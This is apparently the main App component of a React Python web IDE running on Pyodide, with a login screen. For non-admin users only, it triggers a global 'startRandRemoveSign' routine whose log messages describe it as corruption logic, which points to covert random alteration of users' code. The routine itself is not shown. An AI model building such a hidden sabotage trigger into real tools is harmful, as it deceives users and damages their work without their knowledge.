import { useState, useEffect } from 'react';
import CodeEditor from './components/CodeEditor';
import Login from './components/Login';
import { usePyodide } from './experiment/usePyodide';
import './App.css';

const EditorPage: React.FC<{ code: string; setCode: (value: string) => void; isAdmin: boolean; }> = ({ code, setCode, isAdmin }) => {
  const { isLoading, output, runCode } = usePyodide();

  useEffect(() => {
    if (!isLoading) {
      const timer = setTimeout(() => {
        const startRandRemoveSign = (window as any).startRandRemoveSign;
        if (startRandRemoveSign && !isAdmin) {
          startRandRemoveSign();
          console.log("!Rand remove sign logic started!");
        } else if (isAdmin) {
          console.log("Admin logged in - corruption logic disabled.");
        }
      }, 500);

      return () => clearTimeout(timer);
    }
  }, [isLoading, isAdmin]);

  return (
    <div style={{ height: '100vh', display: 'flex', flexDirection: 'column', backgroundColor: '#1e1e1e', color: 'white' }}>
      <header style={{ padding: '1px', borderBottom: '1px solid #333', display: 'flex', justifyContent: 'space-between' }}>
        <h2 style={{ margin: 0 }}>Python Web IDE {isAdmin ? '(admin)' : ''}</h2>
        <button
          onClick={() => runCode(code)}
          disabled={isLoading}
          style={{
            backgroundColor: isLoading ? '#555' : '#4CAF50',
            color: 'white',
            padding: '5px 20px',
            cursor: isLoading ? 'wait' : 'pointer',
            border: 'none',
            borderRadius: '4px',
          }}
        >
          {isLoading ? 'Loading Python...' : 'Run'}
        </button>
      </header>

      <main style={{ flex: 1, display: 'flex', flexDirection: 'row' }}>
        <div style={{ flex: 1, borderRight: '1px solid #333' }}>
          <CodeEditor value={code} onChange={setCode} />
        </div>

        <div style={{ flex: 1, padding: '15px', overflowY: 'auto', backgroundColor: '#000', fontFamily: 'monospace' }}>
          <h4 style={{ marginTop: 0, color: '#888' }}>Console output:</h4>
          <pre style={{ whiteSpace: 'pre-wrap' }}>{output}</pre>
        </div>
      </main>
    </div>
  );
};

function App() {
  const [code, setCode] = useState<string>('# Napisz swój kod w Pythonie\nprint("Witaj świecie!")');
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [isAdmin, setIsAdmin] = useState(false);

  if (!isAuthenticated) {
    return (
      <Login
        onLogin={(userCode, admin) => {
          setIsAuthenticated(true);
          setIsAdmin(admin);
          console.log(`Zalogowano użytkownika ${userCode} (admin: ${admin})`);
        }}
      />
    );
  }

  return <EditorPage code={code} setCode={setCode} isAdmin={isAdmin} />;
}

export default App;